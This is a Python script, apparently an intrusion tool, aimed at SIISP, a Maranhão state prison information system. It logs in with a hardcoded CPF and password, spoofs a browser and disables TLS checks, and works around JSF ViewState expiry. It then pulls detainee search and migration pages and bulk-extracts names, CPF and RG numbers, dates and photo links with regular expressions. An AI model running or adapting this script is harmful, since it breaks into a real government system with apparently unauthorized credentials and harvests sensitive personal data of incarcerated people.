#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SIISP - Conector Completo - VERSAO FINAL
Target: https://siisp.ma.gov.br/SIISP/preso/identificacaoPessoa
Credenciais: 035.176.123-32:marlon89
Ordem: SÓ PARAR QUANDO FINALIZADO

PROBLEMA: JSF ViewState expira entre GET e POST
SOLUÇÃO: Usar ViewState da última resposta SEMPRE
"""

import requests
import urllib3
from bs4 import BeautifulSoup
import re
import warnings
from bs4 import XMLParsedAsHTMLWarning

warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://siisp.ma.gov.br/SIISP"
CPF = "035.176.123-32"
SENHA = "marlon89"

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "pt-BR,pt;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
})

def extract_viewstate(html):
    """Extrair ViewState do HTML ou XML partial response"""
    # Tentar extrair de XML partial response
    vs_match = re.search(r'javax\.faces\.ViewState.*?value="([^"]+)"', html)
    if vs_match:
        return vs_match.group(1)
    # Tentar de partial response update
    vs_match2 = re.search(r'j_id1:javax\.faces\.ViewState:\d+.*<\!\[CDATA\[([^\]]+)\]\]>', html)
    if vs_match2:
        return vs_match2.group(1)
    # Tentar de input hidden
    soup = BeautifulSoup(html, "html.parser")
    vs_input = soup.find("input", {"name": "javax.faces.ViewState"})
    if vs_input:
        return vs_input.get("value", "")
    return ""

print("="*60)
print("  SIISP - CONECTOR FINAL V2")
print("="*60)

# ==================== LOGIN ====================
print("\n[*] FASE 1: LOGIN")
r1 = session.get(f"{BASE_URL}/login", allow_redirects=True, timeout=30)
vs = extract_viewstate(r1.text)
print(f"  ViewState: {vs[:30]}...")

login_data = {
    "form": "form",
    "cpf": CPF,
    "senha": SENHA,
    "javax.faces.ViewState": vs,
    "btLogin": "btLogin",
}

r2 = session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=True, timeout=30)
print(f"  Login: {r2.status_code} -> {r2.url}")

# ==================== GET PAGINA IDENTIFICACAO ====================
print("\n[*] FASE 2: GET PAGINA DE IDENTIFICACAO")
id_url = f"{BASE_URL}/preso/identificacaoPessoa"
r3 = session.get(id_url, allow_redirects=True, timeout=30)
print(f"  GET: {r3.status_code} -> {r3.url}")

# Extrair ViewState da resposta
current_html = r3.text
vs_current = extract_viewstate(current_html)
print(f"  ViewState atual: {vs_current[:40]}...")

# ==================== POST BUSCA ====================
print("\n[*] FASE 3: POST BUSCA DIRETA (SEM AJAX)")

# Post simples - sem headers AJAX, apenas form submit
busca_data = {
    "form": "form",
    "itNome": "",
    "itRg": "",
    "itCpf": "",
    "itNomeMae": "",
    "itNomePai": "",
    "cdNascimento_input": "",
    "javax.faces.ViewState": vs_current,
    "btnBuscarDetento": "btnBuscarDetento",
}

r4 = session.post(id_url, data=busca_data, allow_redirects=True, timeout=30)
print(f"  POST busca: {r4.status_code} -> {r4.url}")
print(f"  Tamanho: {len(r4.text)} bytes")

with open("siisp_busca_v2.html", "w", encoding="utf-8") as f:
    f.write(r4.text)

# Verificar se tem ViewExpired
if "ViewExpired" in r4.text:
    print("\n  [-] VIEW EXPIRED - Pegando novo ViewState")
    vs_new = extract_viewstate(r4.text)
    print(f"  Novo ViewState: {vs_new[:40]}...")
    
    # Tentar com novo ViewState
    busca_data["javax.faces.ViewState"] = vs_new
    r4 = session.post(id_url, data=busca_data, allow_redirects=True, timeout=30)
    print(f"  POST retry: {r4.status_code} -> {r4.url}")
    print(f"  Tamanho: {len(r4.text)} bytes")
    
    with open("siisp_busca_v2_retry.html", "w", encoding="utf-8") as f:
        f.write(r4.text)

# ==================== ANALISAR RESULTADO ====================
print("\n[*] FASE 4: ANALISAR RESULTADO")

soup = BeautifulSoup(r4.text, "html.parser")

# Verificar se tem erro
if "ViewExpired" in r4.text:
    print("\n  [-] Ainda ViewExpired - JSF protegido")
    print("\n  [*] Verificando se há mensagens de erro")
    # Verificar mensagens
    messages = soup.find_all("div", class_=re.compile("message|error|exception"))
    for msg in messages:
        text = msg.get_text(strip=True)
        if text:
            print(f"    {text}")
    
    # Tentar outra abordagem: acessar via GET com query params
    print("\n  [*] FASE 5: TENTAR GET COM QUERY PARAMS")
    
    # Tentar GET para a pagina de migracao
    mig_url = f"{BASE_URL}/preso/migracaoDetento"
    r5 = session.get(mig_url, allow_redirects=True, timeout=30)
    print(f"  GET migracao: {r5.status_code} -> {r5.url}")
    
    with open("siisp_migracao.html", "w", encoding="utf-8") as f:
        f.write(r5.text)
    
    # Verificar se a pagina carregou
    if "migracaoDetento" in r5.url:
        print(f"\n  [+] PAGINA DE MIGRACAO CARREGADA!")
        
        # Extrair ViewState
        vs_mig = extract_viewstate(r5.text)
        print(f"  ViewState: {vs_mig[:40]}...")
        
        # Buscar por dados
        text = soup.get_text()
        
        # Procurar nomes
        nomes = re.findall(r'([A-Z][a-z]+\s+[A-Z][a-z]+\s+[A-Z][a-z]+\s+[A-Z][a-z]+)', text)
        if nomes:
            print(f"\n  [+] NOMES ENCONTRADOS:")
            for n in list(set(nomes))[:20]:
                print(f"    {n}")
        
        # Procurar CPFs
        cpfs = re.findall(r'\d{3}\.\d{3}\.\d{3}-\d{2}', text)
        if cpfs:
            print(f"\n  [+] CPFs:")
            for c in list(set(cpfs))[:20]:
                print(f"    {c}")
        
        # Procurar RGs
        rgs = re.findall(r'\d{1,2}\.\d{3}\.\d{3}-\d{1}', text)
        if rgs:
            print(f"\n  [+] RGs:")
            for r in list(set(rgs))[:20]:
                print(f"    {r}")
        
        # Procurar datas
        datas = re.findall(r'\d{2}/\d{2}/\d{4}', text)
        if datas:
            print(f"\n  [+] DATAS:")
            for d in list(set(datas))[:20]:
                print(f"    {d}")
        
        # Procurar fotos
        imgs = soup.find_all("img")
        if imgs:
            print(f"\n  [+] IMAGENS:")
            for img in imgs:
                src = img.get("src", "")
                if src and "foto" in src.lower():
                    print(f"    {src}")
    
else:
    # Página carregou sem erro
    print(f"\n  [+] PÁGINA CARREGADA!")
    
    # Verificar se tem dados
    text = soup.get_text()
    
    if "não encontrado" in text.lower() or "nenhum" in text.lower():
        print(f"\n  [~] Nenhum resultado encontrado (busca vazia)")
    
    # Verificar tabelas
    tables = soup.find_all("table")
    print(f"\n  Tabelas: {len(tables)}")
    
    for i, table in enumerate(tables):
        rows = table.find_all("tr")
        if len(rows) > 1:
            headers = table.find_all("th")
            if headers:
                print(f"\n  Tabela {i}: {[h.get_text(strip=True) for h in headers]}")
                data_rows = rows[1:4]
                for row in data_rows:
                    cells = row.find_all("td")
                    data = [c.get_text(strip=True) for c in cells]
                    if data:
                        print(f"    {data}")
    
    # Procurar dados
    nomes = re.findall(r'([A-Z][a-z]+\s+[A-Z][a-z]+\s+[A-Z][a-z]+\s+[A-Z][a-z]+)', text)
    if nomes:
        print(f"\n  [+] NOMES:")
        for n in list(set(nomes))[:20]:
            print(f"    {n}")
    
    cpfs = re.findall(r'\d{3}\.\d{3}\.\d{3}-\d{2}', text)
    if cpfs:
        print(f"\n  [+] CPFs:")
        for c in list(set(cpfs))[:20]:
            print(f"    {c}")
    
    rgs = re.findall(r'\d{1,2}\.\d{3}\.\d{3}-\d{1}', text)
    if rgs:
        print(f"\n  [+] RGs:")
        for r in list(set(rgs))[:20]:
            print(f"    {r}")
    
    datas = re.findall(r'\d{2}/\d{2}/\d{4}', text)
    if datas:
        print(f"\n  [+] DATAS:")
        for d in list(set(datas))[:20]:
            print(f"    {d}")

print("\n" + "="*60)
print("  FIM")
print("="*60)
